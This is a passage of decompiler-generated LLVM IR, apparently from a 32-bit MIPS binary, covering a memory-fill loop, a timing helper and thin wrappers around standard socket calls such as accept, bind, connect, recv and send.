  %v2_405528 = inttoptr i32 %v1_405528 to i32*
  %v3_405528 = load i32, i32* %v2_405528, align 4
  %v1_40552c = add i32 %v0_405528, 8
  %v2_40552c = inttoptr i32 %v1_40552c to i32*
  %v3_40552c = load i32, i32* %v2_40552c, align 4
  %v3_405530 = load i32, i32* @global_var_449498.316, align 4
  store i32 %v3_405530, i32* @t9, align 4
  %v2_405534 = icmp ult i32 %v3_405528, %v3_40552c
  br i1 %v2_405534, label %dec_label_pc_405568, label %dec_label_pc_40553c

dec_label_pc_40553c:                              ; preds = %dec_label_pc_405528
  %v1_405540 = inttoptr i32 %v0_405528 to i32*
  %v2_405540 = load i32, i32* %v1_405540, align 4
  store i32 %v2_405540, i32* @a0, align 4
  %v1_405544 = add i32 %v0_405528, 12
  %v2_405544 = inttoptr i32 %v1_405544 to i32*
  %v3_405544 = load i32, i32* %v2_405544, align 4
  %v1_405548 = add i32 %v0_405528, 20
  %v2_405548 = inttoptr i32 %v1_405548 to i32*
  %v3_405548 = load i32, i32* %v2_405548, align 4
  store i32 %v3_405548, i32* @a2, align 4
  %v4_40554c = call i32 @function_406f40(i32 %v2_405540, i32 %v3_405544, i32 %v3_405548)
  store i32 %v4_40554c, i32* @v0, align 4
  %v1_405558 = icmp slt i32 %v4_40554c, 1
  store i32 0, i32* @s0, align 4
  br i1 %v1_405558, label %dec_label_pc_4055a4, label %dec_label_pc_40555c

dec_label_pc_40555c:                              ; preds = %dec_label_pc_40553c
  %v1_405560 = load i32, i32* @s1, align 4
  %v2_405560 = add i32 %v1_405560, 8
  %v3_405560 = inttoptr i32 %v2_405560 to i32*
  store i32 %v4_40554c, i32* %v3_405560, align 4
  %v0_405564 = load i32, i32* @s1, align 4
  %v1_405564 = add i32 %v0_405564, 4
  %v2_405564 = inttoptr i32 %v1_405564 to i32*
  store i32 0, i32* %v2_405564, align 4
  %v0_405568.pre = load i32, i32* @s1, align 4
  br label %dec_label_pc_405568

dec_label_pc_405568:                              ; preds = %dec_label_pc_405528, %dec_label_pc_40555c
  %v1_405584 = phi i32 [ %v0_405528, %dec_label_pc_405528 ], [ %v0_405568.pre, %dec_label_pc_40555c ]
  %v1_405568 = add i32 %v1_405584, 4
  %v2_405568 = inttoptr i32 %v1_405568 to i32*
  %v3_405568 = load i32, i32* %v2_405568, align 4
  %v1_40556c = add i32 %v1_405584, 12
  %v2_40556c = inttoptr i32 %v1_40556c to i32*
  %v3_40556c = load i32, i32* %v2_40556c, align 4
  %v2_405574 = add i32 %v3_40556c, %v3_405568
  store i32 %v2_405574, i32* @s0, align 4
  %v1_405578 = add i32 %v2_405574, 8
  %v2_405578 = inttoptr i32 %v1_405578 to i16*
  %v3_405578 = load i16, i16* %v2_405578, align 2
  %v4_405578 = zext i16 %v3_405578 to i32
  %v2_405580 = add i32 %v4_405578, %v3_405568
  store i32 %v2_405580, i32* %v2_405568, align 4
  %v0_405588 = load i32, i32* @s0, align 4
  %v1_405588 = add i32 %v0_405588, 4
  %v2_405588 = inttoptr i32 %v1_405588 to i32*
  %v3_405588 = load i32, i32* %v2_405588, align 4
  %v1_405590 = load i32, i32* @s1, align 4
  %v2_405590 = add i32 %v1_405590, 16
  %v3_405590 = inttoptr i32 %v2_405590 to i32*
  store i32 %v3_405588, i32* %v3_405590, align 4
  %v0_405594 = load i32, i32* @s0, align 4
  %v1_405594 = inttoptr i32 %v0_405594 to i32*
  %v2_405594 = load i32, i32* %v1_405594, align 4
  store i32 %v2_405594, i32* @v0, align 4
  %v1_40559c = icmp eq i32 %v2_405594, 0
  br i1 %v1_40559c, label %dec_label_pc_405528, label %dec_label_pc_4055a4

dec_label_pc_4055a4:                              ; preds = %dec_label_pc_405568, %dec_label_pc_40553c
  %v3_4055ac = call i32 @function_40688c(i32 %v3_405504, i32 1)
  %v0_4055b4 = load i32, i32* @s0, align 4
  ret i32 %v0_4055b4

; uselistorder directives
  uselistorder i32 %v1_405584, { 1, 0 }
  uselistorder i32 %v0_405528, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_405568, { 1, 0 }
}

define i32 @function_4055d0() local_unnamed_addr {
dec_label_pc_4055d0:
  %v3_4055dc = load i32, i32* bitcast (i32** @global_var_4492ac.318 to i32*), align 4
  ret i32 %v3_4055dc
}

define i32 @function_4055f0() local_unnamed_addr {
dec_label_pc_4055f0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v3_405608 = load i32, i32* @global_var_4493b4.319, align 4
  store i32 %v3_405608, i32* @t9, align 4
  %v5_405610 = bitcast i32* %stack_var_-24 to %tms*
  %v6_405610 = call i32 @function_407590(%tms* %v5_405610)
  %v3_40561c = load i32, i32* %stack_var_-24, align 4
  %v2_405624 = add i32 %v3_40561c, %tmp
  %v1_405644 = mul i32 %v2_405624, 10000
  %v2_405650 = and i32 %v1_405644, 2147483632
  ret i32 %v2_405650

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_405660(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405660:
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %a2.global-to-local, align 4
  store i32 %arg2, i32* @a1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @a0, align 4
  %v1_405660 = icmp slt i32 %arg3, 8
  %v2_405660 = zext i1 %v1_405660 to i32
  store i32 %v2_405660, i32* @t1, align 4
  br i1 %v1_405660, label %dec_label_pc_4056d4, label %dec_label_pc_405668

dec_label_pc_405668:                              ; preds = %dec_label_pc_405660
  %v1_40566c = icmp eq i32 %arg2, 0
  %v3_40566c = urem i32 %arg2, 256
  br i1 %v1_40566c, label %dec_label_pc_405684, label %dec_label_pc_405670

dec_label_pc_405670:                              ; preds = %dec_label_pc_405668
  %v1_405674 = mul nuw nsw i32 %v3_40566c, 256
  %v2_405678 = or i32 %v1_405674, %v3_40566c
  %v1_40567c = mul i32 %v2_405678, 65536
  %v2_405680 = or i32 %v1_40567c, %v2_405678
  br label %dec_label_pc_405684

dec_label_pc_405684:                              ; preds = %dec_label_pc_405668, %dec_label_pc_405670
  %storemerge = phi i32 [ %v2_405680, %dec_label_pc_405670 ], [ %v3_40566c, %dec_label_pc_405668 ]
  %v0_4056b44 = phi i32 [ %v2_405680, %dec_label_pc_405670 ], [ %v3_40566c, %dec_label_pc_405668 ]
  store i32 %storemerge, i32* @a1, align 4
  %v1_405684 = sub i32 0, %tmp
  %v1_405688 = urem i32 %v1_405684, 4
  %v1_40568c = icmp eq i32 %v1_405688, 0
  %v4_40568c = sub i32 %arg3, %v1_405688
  store i32 %v4_40568c, i32* %a2.global-to-local, align 4
  br i1 %v1_40568c, label %dec_label_pc_40569c, label %dec_label_pc_405690

dec_label_pc_405690:                              ; preds = %dec_label_pc_405684
  %v2_405698 = add i32 %v1_405688, %tmp
  store i32 %v2_405698, i32* @a0, align 4
  br label %dec_label_pc_40569c

dec_label_pc_40569c:                              ; preds = %dec_label_pc_405684, %dec_label_pc_405690
  %v1_4056a8 = phi i32 [ %tmp, %dec_label_pc_405684 ], [ %v2_405698, %dec_label_pc_405690 ]
  %v1_40569c = urem i32 %v4_40568c, 8
  %v2_4056a0 = icmp eq i32 %v4_40568c, %v1_40569c
  %v5_4056a0 = sub i32 %v4_40568c, %v1_40569c
  store i32 %v5_4056a0, i32* %a3.global-to-local, align 4
  br i1 %v2_4056a0, label %dec_label_pc_4056c0, label %dec_label_pc_4056a4

dec_label_pc_4056a4:                              ; preds = %dec_label_pc_40569c
  %v2_4056a8 = add i32 %v1_4056a8, %v5_4056a0
  store i32 %v2_4056a8, i32* %a3.global-to-local, align 4
  store i32 %v1_40569c, i32* %a2.global-to-local, align 4
  %v1_4056b016 = add i32 %v1_4056a8, 8
  store i32 %v1_4056b016, i32* @a0, align 4
  %v3_4056b417 = inttoptr i32 %v1_4056a8 to i32*
  store i32 %v0_4056b44, i32* %v3_4056b417, align 4
  %v0_4056b818 = load i32, i32* @a0, align 4
  %v1_4056b819 = load i32, i32* %a3.global-to-local, align 4
  %v2_4056b820 = icmp eq i32 %v0_4056b818, %v1_4056b819
  %v3_4056b821 = load i32, i32* @a1, align 4
  %v5_4056b822 = add i32 %v0_4056b818, -4
  %v6_4056b823 = inttoptr i32 %v5_4056b822 to i32*
  store i32 %v3_4056b821, i32* %v6_4056b823, align 4
  br i1 %v2_4056b820, label %dec_label_pc_4056c0.loopexit, label %dec_label_pc_4056b0.dec_label_pc_4056b0_crit_edge

dec_label_pc_4056b0.dec_label_pc_4056b0_crit_edge: ; preds = %dec_label_pc_4056a4, %dec_label_pc_4056b0.dec_label_pc_4056b0_crit_edge
  %v0_4056b0.pre = load i32, i32* @a0, align 4
  %v0_4056b4.pre = load i32, i32* @a1, align 4
  %v1_4056b0 = add i32 %v0_4056b0.pre, 8
  store i32 %v1_4056b0, i32* @a0, align 4
  %v3_4056b4 = inttoptr i32 %v0_4056b0.pre to i32*
  store i32 %v0_4056b4.pre, i32* %v3_4056b4, align 4
  %v0_4056b8 = load i32, i32* @a0, align 4
  %v1_4056b8 = load i32, i32* %a3.global-to-local, align 4
  %v2_4056b8 = icmp eq i32 %v0_4056b8, %v1_4056b8
  %v3_4056b8 = load i32, i32* @a1, align 4
  %v5_4056b8 = add i32 %v0_4056b8, -4
  %v6_4056b8 = inttoptr i32 %v5_4056b8 to i32*
  store i32 %v3_4056b8, i32* %v6_4056b8, align 4
  br i1 %v2_4056b8, label %dec_label_pc_4056c0.loopexit, label %dec_label_pc_4056b0.dec_label_pc_4056b0_crit_edge

dec_label_pc_4056c0.loopexit:                     ; preds = %dec_label_pc_4056b0.dec_label_pc_4056b0_crit_edge, %dec_label_pc_4056a4
  %v0_4056c0.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4056c0

dec_label_pc_4056c0:                              ; preds = %dec_label_pc_4056c0.loopexit, %dec_label_pc_40569c
  %v0_4056c0 = phi i32 [ %v0_4056c0.pre, %dec_label_pc_4056c0.loopexit ], [ %v4_40568c, %dec_label_pc_40569c ]
  %v1_4056c0 = and i32 %v0_4056c0, 4
  %v1_4056c4 = icmp eq i32 %v1_4056c0, 0
  %v4_4056c4 = sub i32 %v0_4056c0, %v1_4056c0
  store i32 %v4_4056c4, i32* %a2.global-to-local, align 4
  br i1 %v1_4056c4, label %dec_label_pc_4056c0.dec_label_pc_4056d4_crit_edge, label %dec_label_pc_4056c8

dec_label_pc_4056c0.dec_label_pc_4056d4_crit_edge: ; preds = %dec_label_pc_4056c0
  %v3_4056d4.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_4056d4

dec_label_pc_4056c8:                              ; preds = %dec_label_pc_4056c0
  %v0_4056cc = load i32, i32* @a1, align 4
  %v1_4056cc = load i32, i32* @a0, align 4
  %v2_4056cc = inttoptr i32 %v1_4056cc to i32*
  store i32 %v0_4056cc, i32* %v2_4056cc, align 4
  %v0_4056d0 = load i32, i32* @a0, align 4
  %v1_4056d0 = add i32 %v0_4056d0, 4
  store i32 %v1_4056d0, i32* @a0, align 4
  %v0_4056d4.pr.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4056d4

dec_label_pc_4056d4:                              ; preds = %dec_label_pc_405660, %dec_label_pc_4056c8, %dec_label_pc_4056c0.dec_label_pc_4056d4_crit_edge
  %v3_4056d4 = phi i32 [ %v3_4056d4.pre, %dec_label_pc_4056c0.dec_label_pc_4056d4_crit_edge ], [ %v1_4056d0, %dec_label_pc_4056c8 ], [ %tmp, %dec_label_pc_405660 ]
  %v0_4056d4 = phi i32 [ %v4_4056c4, %dec_label_pc_4056c0.dec_label_pc_4056d4_crit_edge ], [ %v0_4056d4.pr.pre, %dec_label_pc_4056c8 ], [ %arg3, %dec_label_pc_405660 ]
  %v1_4056d4 = icmp slt i32 %v0_4056d4, 1
  %v4_4056d4 = add i32 %v0_4056d4, %v3_4056d4
  store i32 %v4_4056d4, i32* @a3, align 4
  br i1 %v1_4056d4, label %dec_label_pc_4056e8, label %dec_label_pc_4056dc.preheader

dec_label_pc_4056dc.preheader:                    ; preds = %dec_label_pc_4056d4
  %v1_4056dc11 = add i32 %v3_4056d4, 1
  store i32 %v1_4056dc11, i32* @a0, align 4
  %v2_4056e012 = icmp eq i32 %v1_4056dc11, %v4_4056d4
  %v3_4056e013 = load i32, i32* @a1, align 4
  %v4_4056e014 = trunc i32 %v3_4056e013 to i8
  %v7_4056e015 = inttoptr i32 %v3_4056d4 to i8*
  store i8 %v4_4056e014, i8* %v7_4056e015, align 1
  br i1 %v2_4056e012, label %dec_label_pc_4056e8, label %dec_label_pc_4056dc.dec_label_pc_4056dc_crit_edge

dec_label_pc_4056dc.dec_label_pc_4056dc_crit_edge: ; preds = %dec_label_pc_4056dc.preheader, %dec_label_pc_4056dc.dec_label_pc_4056dc_crit_edge
  %v0_4056dc.pre = load i32, i32* @a0, align 4
  %v1_4056e0.pre = load i32, i32* @a3, align 4
  %v1_4056dc = add i32 %v0_4056dc.pre, 1
  store i32 %v1_4056dc, i32* @a0, align 4
  %v2_4056e0 = icmp eq i32 %v1_4056dc, %v1_4056e0.pre
  %v3_4056e0 = load i32, i32* @a1, align 4
  %v4_4056e0 = trunc i32 %v3_4056e0 to i8
  %v7_4056e0 = inttoptr i32 %v0_4056dc.pre to i8*
  store i8 %v4_4056e0, i8* %v7_4056e0, align 1
  br i1 %v2_4056e0, label %dec_label_pc_4056e8, label %dec_label_pc_4056dc.dec_label_pc_4056dc_crit_edge

dec_label_pc_4056e8:                              ; preds = %dec_label_pc_4056dc.preheader, %dec_label_pc_4056dc.dec_label_pc_4056dc_crit_edge, %dec_label_pc_4056d4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_4056c0, { 1, 0 }
  uselistorder i32 %v1_40569c, { 2, 0, 1 }
  uselistorder i32 %v4_40568c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_405688, { 2, 1, 0 }
  uselistorder i32 %v2_405678, { 1, 0 }
  uselistorder i32 %v3_40566c, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 4, 1, 2, 0, 3, 5 }
  uselistorder i32* %a3.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %a2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 65536, { 2, 5, 3, 4, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 18, 1, 17, 19, 22, 20, 21, 0 }
  uselistorder label %dec_label_pc_4056e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_4056dc.dec_label_pc_4056dc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_4056d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_4056b0.dec_label_pc_4056b0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_40569c, { 1, 0 }
  uselistorder label %dec_label_pc_405684, { 1, 0 }
}

define i32 @function_4056f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4056f0:
  %stack_var_-16 = alloca i32, align 4
  %v3_405708 = load i32, i32* @global_var_4492c4.320, align 4
  store i32 %v3_405708, i32* @t9, align 4
  %v3_405710 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v3_405710, i32* @a1, align 4
  %v5_405710 = bitcast i32* %stack_var_-16 to i8*
  %v6_405710 = call i32 @function_407ca0(i8* %v5_405710)
  %v1_40571c = icmp eq i32 %v6_405710, 0
  br i1 %v1_40571c, label %dec_label_pc_405728, label %dec_label_pc_405720

dec_label_pc_405720:                              ; preds = %dec_label_pc_4056f0
  %v3_405724 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_405728

dec_label_pc_405728:                              ; preds = %dec_label_pc_4056f0, %dec_label_pc_405720
  %v0_40572c = phi i32 [ -1, %dec_label_pc_4056f0 ], [ %v3_405724, %dec_label_pc_405720 ]
  ret i32 %v0_40572c

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_405728, { 1, 0 }
}

define i32 @function_405740(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405740:
  %s0.global-to-local = alloca i32, align 4
  %v5_405760 = inttoptr i32 %arg3 to i32*
  %v6_405760 = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_405760)
  %v3_405764 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405764, i32* @t9, align 4
  %v1_405768 = icmp eq i32 %arg4, 0
  store i32 %v6_405760, i32* %s0.global-to-local, align 4
  br i1 %v1_405768, label %dec_label_pc_405784, label %dec_label_pc_40576c

dec_label_pc_40576c:                              ; preds = %dec_label_pc_405740
  %v1_405770 = call i32 @function_4055d0()
  %v0_40577c = load i32, i32* %s0.global-to-local, align 4
  %v2_40577c = inttoptr i32 %v1_405770 to i32*
  store i32 %v0_40577c, i32* %v2_40577c, align 4
  br label %dec_label_pc_405784

dec_label_pc_405784:                              ; preds = %dec_label_pc_405740, %dec_label_pc_40576c
  %v4_40578c = phi i32 [ %v6_405760, %dec_label_pc_405740 ], [ -1, %dec_label_pc_40576c ]
  ret i32 %v4_40578c

; uselistorder directives
  uselistorder label %dec_label_pc_405784, { 1, 0 }
}

define i32 @function_4057a0(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4057a0:
  %s0.global-to-local = alloca i32, align 4
  %v5_4057c0 = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  %v3_4057c4 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_4057c4, i32* @t9, align 4
  %v1_4057c8 = icmp eq i32 %arg4, 0
  store i32 %v5_4057c0, i32* %s0.global-to-local, align 4
  br i1 %v1_4057c8, label %dec_label_pc_4057e4, label %dec_label_pc_4057cc

dec_label_pc_4057cc:                              ; preds = %dec_label_pc_4057a0
  %v1_4057d0 = call i32 @function_4055d0()
  %v0_4057dc = load i32, i32* %s0.global-to-local, align 4
  %v2_4057dc = inttoptr i32 %v1_4057d0 to i32*
  store i32 %v0_4057dc, i32* %v2_4057dc, align 4
  br label %dec_label_pc_4057e4

dec_label_pc_4057e4:                              ; preds = %dec_label_pc_4057a0, %dec_label_pc_4057cc
  %v4_4057ec = phi i32 [ %v5_4057c0, %dec_label_pc_4057a0 ], [ -1, %dec_label_pc_4057cc ]
  ret i32 %v4_4057ec

; uselistorder directives
  uselistorder label %dec_label_pc_4057e4, { 1, 0 }
}

define i32 @function_405800(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405800:
  %s0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %sockaddr* %arg2 to i32
  store i32 %tmp, i32* @a1, align 4
  %v5_405820 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  %v3_405824 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405824, i32* @t9, align 4
  %v0_405828 = load i32, i32* @a3, align 4
  %v1_405828 = icmp eq i32 %v0_405828, 0
  store i32 %v5_405820, i32* %s0.global-to-local, align 4
  br i1 %v1_405828, label %dec_label_pc_405844, label %dec_label_pc_40582c

dec_label_pc_40582c:                              ; preds = %dec_label_pc_405800
  %v1_405830 = call i32 @function_4055d0()
  %v0_40583c = load i32, i32* %s0.global-to-local, align 4
  %v2_40583c = inttoptr i32 %v1_405830 to i32*
  store i32 %v0_40583c, i32* %v2_40583c, align 4
  br label %dec_label_pc_405844

dec_label_pc_405844:                              ; preds = %dec_label_pc_405800, %dec_label_pc_40582c
  %v4_40584c = phi i32 [ %v5_405820, %dec_label_pc_405800 ], [ -1, %dec_label_pc_40582c ]
  ret i32 %v4_40584c

; uselistorder directives
  uselistorder label %dec_label_pc_405844, { 1, 0 }
}

define i32 @function_405860(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405860:
  %s0.global-to-local = alloca i32, align 4
  %v5_405880 = inttoptr i32 %arg3 to i32*
  %v6_405880 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_405880)
  %v3_405884 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405884, i32* @t9, align 4
  %v0_405888 = load i32, i32* @a3, align 4
  %v1_405888 = icmp eq i32 %v0_405888, 0
  store i32 %v6_405880, i32* %s0.global-to-local, align 4
  br i1 %v1_405888, label %dec_label_pc_4058a4, label %dec_label_pc_40588c

dec_label_pc_40588c:                              ; preds = %dec_label_pc_405860
  %v1_405890 = call i32 @function_4055d0()
  %v0_40589c = load i32, i32* %s0.global-to-local, align 4
  %v2_40589c = inttoptr i32 %v1_405890 to i32*
  store i32 %v0_40589c, i32* %v2_40589c, align 4
  br label %dec_label_pc_4058a4

dec_label_pc_4058a4:                              ; preds = %dec_label_pc_405860, %dec_label_pc_40588c
  %v4_4058ac = phi i32 [ %v6_405880, %dec_label_pc_405860 ], [ -1, %dec_label_pc_40588c ]
  ret i32 %v4_4058ac

; uselistorder directives
  uselistorder label %dec_label_pc_4058a4, { 1, 0 }
}

define i32 @function_4058c0(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4058c0:
  %s0.global-to-local = alloca i32, align 4
  %v5_4058f8 = call i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32* null)
  %v3_405900 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405900, i32* @t9, align 4
  %v1_405904 = icmp eq i32* %arg4, null
  store i32 %v5_4058f8, i32* %s0.global-to-local, align 4
  br i1 %v1_405904, label %dec_label_pc_405920, label %dec_label_pc_405908

dec_label_pc_405908:                              ; preds = %dec_label_pc_4058c0
  %v1_40590c = call i32 @function_4055d0()
  %v0_405918 = load i32, i32* %s0.global-to-local, align 4
  %v2_405918 = inttoptr i32 %v1_40590c to i32*
  store i32 %v0_405918, i32* %v2_405918, align 4
  br label %dec_label_pc_405920

dec_label_pc_405920:                              ; preds = %dec_label_pc_4058c0, %dec_label_pc_405908
  %v4_405930 = phi i32 [ %v5_4058f8, %dec_label_pc_4058c0 ], [ -1, %dec_label_pc_405908 ]
  ret i32 %v4_405930

; uselistorder directives
  uselistorder label %dec_label_pc_405920, { 1, 0 }
}

define i32 @function_405940(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405940:
  %s0.global-to-local = alloca i32, align 4
  %v2_405960 = call i32 @listen(i32 %arg1, i32 %arg2)
  %v3_405964 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405964, i32* @t9, align 4
  %v1_405968 = icmp eq i32 %arg3, 0
  store i32 %v2_405960, i32* %s0.global-to-local, align 4
  br i1 %v1_405968, label %dec_label_pc_405984, label %dec_label_pc_40596c

dec_label_pc_40596c:                              ; preds = %dec_label_pc_405940
  %v1_405970 = call i32 @function_4055d0()
  %v0_40597c = load i32, i32* %s0.global-to-local, align 4
  %v2_40597c = inttoptr i32 %v1_405970 to i32*
  store i32 %v0_40597c, i32* %v2_40597c, align 4
  br label %dec_label_pc_405984

dec_label_pc_405984:                              ; preds = %dec_label_pc_405940, %dec_label_pc_40596c
  %v4_40598c = phi i32 [ %v2_405960, %dec_label_pc_405940 ], [ -1, %dec_label_pc_40596c ]
  ret i32 %v4_40598c

; uselistorder directives
  uselistorder label %dec_label_pc_405984, { 1, 0 }
}

define i32 @function_4059a0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4059a0:
  %s0.global-to-local = alloca i32, align 4
  %v1_4059a8 = load i32, i32* @t9, align 4
  %v2_4059a8 = add i32 %v1_4059a8, 309296
  store i32 %v2_4059a8, i32* @gp, align 4
  %v5_4059c0 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  %v3_4059c4 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_4059c4, i32* @t9, align 4
  %v1_4059c8 = icmp eq i32 %arg4, 0
  store i32 %v5_4059c0, i32* %s0.global-to-local, align 4
  br i1 %v1_4059c8, label %dec_label_pc_4059e4, label %dec_label_pc_4059cc

dec_label_pc_4059cc:                              ; preds = %dec_label_pc_4059a0
  %v1_4059d0 = call i32 @function_4055d0()
  store i32 %v2_4059a8, i32* @gp, align 4
  %v0_4059dc = load i32, i32* %s0.global-to-local, align 4
  %v2_4059dc = inttoptr i32 %v1_4059d0 to i32*
  store i32 %v0_4059dc, i32* %v2_4059dc, align 4
  br label %dec_label_pc_4059e4

dec_label_pc_4059e4:                              ; preds = %dec_label_pc_4059a0, %dec_label_pc_4059cc
  %v4_4059ec = phi i32 [ %v5_4059c0, %dec_label_pc_4059a0 ], [ -1, %dec_label_pc_4059cc ]
  ret i32 %v4_4059ec

; uselistorder directives
  uselistorder i32* @gp, { 3, 4, 5, 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 2, 14, 15, 16 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_4059e4, { 1, 0 }
}

define i32 @function_405a00(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_405a00:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @a3, align 4
  store i32 %arg5, i32* %s0.global-to-local, align 4
  %v5_405a40 = call i32 @recvfrom(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32* null)
  %v3_405a48 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405a48, i32* @t9, align 4
  %v1_405a4c = icmp eq i32 %arg4, 0
  store i32 %v5_405a40, i32* %s0.global-to-local, align 4
  br i1 %v1_405a4c, label %dec_label_pc_405a68, label %dec_label_pc_405a50

dec_label_pc_405a50:                              ; preds = %dec_label_pc_405a00
  %v1_405a54 = call i32 @function_4055d0()
  %v0_405a60 = load i32, i32* %s0.global-to-local, align 4
  %v2_405a60 = inttoptr i32 %v1_405a54 to i32*
  store i32 %v0_405a60, i32* %v2_405a60, align 4
  br label %dec_label_pc_405a68

dec_label_pc_405a68:                              ; preds = %dec_label_pc_405a00, %dec_label_pc_405a50
  %v4_405a78 = phi i32 [ %v5_405a40, %dec_label_pc_405a00 ], [ -1, %dec_label_pc_405a50 ]
  ret i32 %v4_405a78

; uselistorder directives
  uselistorder label %dec_label_pc_405a68, { 1, 0 }
}

define i32 @function_405a80(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405a80:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @a3, align 4
  store i32 %arg3, i32* @a2, align 4
  %v5_405aa0 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  %v3_405aa4 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405aa4, i32* @t9, align 4
  %v1_405aa8 = icmp eq i32 %arg4, 0
  store i32 %v5_405aa0, i32* %s0.global-to-local, align 4
  br i1 %v1_405aa8, label %dec_label_pc_405ac4, label %dec_label_pc_405aac

dec_label_pc_405aac:                              ; preds = %dec_label_pc_405a80
  %v1_405ab0 = call i32 @function_4055d0()
  %v0_405abc = load i32, i32* %s0.global-to-local, align 4
  %v2_405abc = inttoptr i32 %v1_405ab0 to i32*
  store i32 %v0_405abc, i32* %v2_405abc, align 4
  br label %dec_label_pc_405ac4

dec_label_pc_405ac4:                              ; preds = %dec_label_pc_405a80, %dec_label_pc_405aac
  %v4_405acc = phi i32 [ %v5_405aa0, %dec_label_pc_405a80 ], [ -1, %dec_label_pc_405aac ]
  ret i32 %v4_405acc

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_405ac4, { 1, 0 }
}

define i32 @function_405ae0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_405ae0:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %s0.global-to-local, align 4
  %v5_405b20 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  %v3_405b28 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405b28, i32* @t9, align 4
  %v1_405b2c = icmp eq i32 %arg4, 0
  store i32 %v5_405b20, i32* %s0.global-to-local, align 4
  br i1 %v1_405b2c, label %dec_label_pc_405b48, label %dec_label_pc_405b30

dec_label_pc_405b30:                              ; preds = %dec_label_pc_405ae0
  %v1_405b34 = call i32 @function_4055d0()
  %v0_405b40 = load i32, i32* %s0.global-to-local, align 4
  %v2_405b40 = inttoptr i32 %v1_405b34 to i32*
  store i32 %v0_405b40, i32* %v2_405b40, align 4
  br label %dec_label_pc_405b48

dec_label_pc_405b48:                              ; preds = %dec_label_pc_405ae0, %dec_label_pc_405b30
  %v4_405b58 = phi i32 [ %v5_405b20, %dec_label_pc_405ae0 ], [ -1, %dec_label_pc_405b30 ]
  ret i32 %v4_405b58

; uselistorder directives
  uselistorder label %dec_label_pc_405b48, { 1, 0 }
}

define i32 @function_405b60(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405b60:
  %s0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* @a3, align 4
